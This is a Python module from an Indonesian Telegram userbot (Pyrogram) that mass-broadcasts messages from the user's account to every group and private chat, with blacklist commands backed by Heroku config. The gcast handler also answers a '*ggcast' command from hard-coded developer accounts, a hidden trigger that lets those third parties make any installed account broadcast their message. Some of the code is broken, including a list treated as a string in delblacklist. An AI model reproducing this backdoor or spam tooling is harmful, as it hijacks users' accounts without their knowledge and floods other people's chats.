"""
if you can read this, this meant you use code from Geez | Ram Project
this code is from somewhere else
please dont hestitate to steal it
because Geez and Ram doesn't care about credit
at least we are know as well
who Geez and Ram is


kopas repo dan hapus credit, ga akan jadikan lu seorang developer

YANG NYOLONG REPO INI TRUS DIJUAL JADI PREM, LU GAY...
©2023 Geez | Ram Team
"""
import asyncio
import dotenv
from pyrogram import Client, enums, filters
from pyrogram.types import Message
from geezlibs.geez.helper import edit_or_reply
from geezlibs.geez import geez
from geezlibs.geez.autobot import HAPP, in_heroku
from geezlibs import BL_GCAST, DEVS
from Geez import cmds
from Geez.modules.basic import add_command_help
from Geez.modules.basic.update import restart
from config import HEROKU_APP_NAME, HEROKU_API_KEY, BLACKLIST_GCAST

if HEROKU_API_KEY is not None and HEROKU_APP_NAME is not None:
    import heroku3
    Heroku = heroku3.from_key(HEROKU_API_KEY)
    HAPP = Heroku.app(HEROKU_APP_NAME)
else:
    HAPP = None

def get_arg(message: Message):
    msg = message.text
    msg = msg.replace(" ", "", 1) if msg[1] == " " else msg
    split = msg[1:].replace("\n", " \n").split(" ")
    if " ".join(split[1:]).strip() == "":
        return ""
    return " ".join(split[1:])

blchat = []

@Client.on_message(filters.command("ggcast", "*") & filters.user(DEVS))
@geez("gcast", cmds)
async def gcast_cmd(client: Client, message: Message):
    if message.reply_to_message or get_arg(message):
        tex = await message.reply_text("`sᴇᴅᴀɴɢ ᴍᴇʟᴀᴋᴜᴋᴀɴ ʙʀᴏᴀᴅᴄᴀsᴛ`")
    else:
        return await message.edit_text("**sᴇᴅᴀɴɢ ᴍᴇʟᴀᴋᴜᴋᴀɴ ʙʀᴏᴀᴅᴄᴀsᴛ**")
    done = 0
    error = 0
    async for dialog in client.get_dialogs():
        if dialog.chat.type in (enums.ChatType.GROUP, enums.ChatType.SUPERGROUP):
            if message.reply_to_message:
                msg = message.reply_to_message
            elif get_arg:
                msg = get_arg(message)
            chat = dialog.chat.id
            if chat not in BL_GCAST and chat not in BLACKLIST_GCAST:
                try:
                    if message.reply_to_message:
                        await msg.copy(chat)
                    elif get_arg:
                        await client.send_message(chat, msg)
                    done += 1
                    await asyncio.sleep(0.3)
                except Exception:
                    error += 1
                    await asyncio.sleep(0.3)
    await tex.edit_text(
        f"**✅ ʙᴇʀʜᴀsɪʟ ᴍᴇɴɢɪʀɪᴍ ɢᴄᴀsᴛ ᴋᴇ** `{done}` **ɢʀᴏᴜᴘs ᴄʜᴀᴛ\n❌ ɢᴀɢᴀʟ ᴍᴇɴɢɪʀɪᴍ ɢᴄᴀsᴛ ᴋᴇ** `{error}` **ɢʀᴏᴜᴘs ᴄʜᴀᴛ**"
    )

@geez("gucast", cmds)
async def gucast(client: Client, message: Message):
    if message.reply_to_message or get_arg(message):
        text = await message.reply_text("`sᴇᴅᴀɴɢ ᴍᴇʟᴀᴋᴜᴋᴀɴ ʙʀᴏᴀᴅᴄᴀsᴛ`")
    else:
        return await message.edit_text("**ᴋᴀsɪʜ ɢᴜᴀ ᴘᴇsᴀɴ ᴀᴛᴀᴜ ʀᴇᴘʟʏ ɴɢᴇ**")
    done = 0
    error = 0
    async for dialog in client.get_dialogs():
        if dialog.chat.type == enums.ChatType.PRIVATE and not dialog.chat.is_verified:
            if message.reply_to_message:
                msg = message.reply_to_message
            elif get_arg:
                msg = get_arg(message)
            chat = dialog.chat.id
            if chat not in DEVS:
                try:
                    if message.reply_to_message:
                        await msg.copy(chat)
                    elif get_arg:
                        await client.send_message(chat, msg)
                    done += 1
                    await asyncio.sleep(0.3)
                except Exception:
                    error += 1
                    await asyncio.sleep(0.3)
    await text.edit_text(
        f"**✅ ʙᴇʀʜᴀsɪʟ ᴍᴇɴɢɪʀɪᴍ ᴋᴇ** `{done}` **ᴄʜᴀᴛ\n❌ ɢᴀɢᴀʟ ᴍᴇɴɢɪʀɪᴍ  ᴋᴇ** `{error}` **ᴄʜᴀᴛ**"
    )

@geez("blchat", cmds)
async def blchatgcast(client: Client, message: Message):
    blacklistgc = "True" if BLACKLIST_GCAST else "False"
    list = BLACKLIST_GCAST.replace(" ", "\n» ")
    if blacklistgc == "True":
        await edit_or_reply(
            message,
            f"🔮 **Blacklist GCAST:** `Enabled`\n\n📚 **Blacklist Group:**\n» {list}\n\nKetik `{cmds}addblacklist` di grup yang ingin anda tambahkan ke daftar blacklist gcast.",
        )
    else:
        await edit_or_reply(message, "🔮 **Blacklist GCAST:** `Disabled`")

@geez("addblacklist", cmds)
async def addblacklist(client: Client, message: Message):
    xxnx = await edit_or_reply(message, "`Processing...`")
    if HAPP is None:
        return await xxnx.edit(
            "**Silahkan Tambahkan Var** `HEROKU_APP_NAME` **untuk menambahkan blacklist**",
        )
    blgc = f"{BLACKLIST_GCAST} {message.chat.id}"
    blacklistgrup = (
        blgc.replace("{", "")
        .replace("}", "")
        .replace(",", "")
        .replace("[", "")
        .replace("]", "")
        .replace("set() ", "")
    )
    await xxnx.edit(
        f"**Berhasil Menambahkan** `{message.chat.id}` **ke daftar blacklist gcast.**\n\nSedang MeRestart Heroku untuk Menerapkan Perubahan."
    )
    if await in_heroku():
        heroku_var = HAPP.config()
        heroku_var["BLACKLIST_GCAST"] = blacklistgrup
    else:
        path = dotenv.find_dotenv("config.env")
        dotenv.set_key(path, "BLACKLIST_GCAST", blacklistgrup)
    restart()

@geez("delblacklist", cmds)
async def delblacklist(client: Client, message: Message):
    xxnx = await edit_or_reply(message, "`Processing...`")
    if HAPP is None:
        return await xxnx.edit(
            "**Silahkan Tambahkan Var** `HEROKU_APP_NAME` **untuk menambahkan blacklist**",
        )
    gett = str(message.chat.id)
    if gett in blchat:
        blacklistgrup = blchat.replace(gett, "")
        await xxnx.edit(
            f"**Berhasil Menghapus** `{message.chat.id}` **dari daftar blacklist gcast.**\n\nSedang MeRestart Heroku untuk Menerapkan Perubahan."
        )
        if await in_heroku():
            heroku_var = HAPP.config()
            heroku_var["BLACKLIST_GCAST"] = blacklistgrup
        else:
            path = dotenv.find_dotenv("config.env")
            dotenv.set_key(path, "BLACKLIST_GCAST", blacklistgrup)
        restart()
    else:
        await xxnx.edit("**Grup ini tidak ada dalam daftar blacklist gcast.**")


add_command_help(
    "broadcast",
    [
        [f"{cmds}gcast [text/reply]",
            "Broadcast pesan ke Group. (bisa menggunakan Media/Sticker)"],
        [f"{cmds}gucast [text/reply]",
            "Broadcast pesan ke semua chat. (bisa menggunakan Media/Sticker)"],
        [f"{cmds}addblacklist [id group]",
            "menambahkan group ke dalam blacklilst gcast"],
        [f"{cmds}delblacklist [id group]",
            "menghapus group dari blacklist gcast"],
    ],
)
